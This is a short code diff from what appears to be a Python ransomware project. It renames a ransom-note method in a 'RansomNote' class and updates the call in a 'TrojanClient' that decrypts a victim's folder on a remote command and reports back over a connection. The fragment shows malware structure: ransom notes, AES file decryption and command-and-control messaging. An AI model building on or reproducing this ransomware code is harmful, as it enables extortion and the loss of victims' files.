@@ -91,7 +91,7 @@ class RansomNote:
         os.system("notepad README_DECRYPT.txt")
 
     @staticmethod
-    def show_decrypted():#ashdsajgfsakg
+    def display_decryption_note():#ashdsajgfsakg
         note = """
         🔓 All your files have been decrypted!
         Your system is restored and your files are back to normal.
@@ -121,7 +121,7 @@ class TrojanClient:
         elif action == "decrypt":
             FileEncryptor.decrypt_folder(self.folder, aes_key)
             del aes_key
-            RansomNote.show_decrypted()
+            RansomNote.display_decryption_note()
             protocol.send(self.connection, "the files are decrypted")
 
         sys.exit()
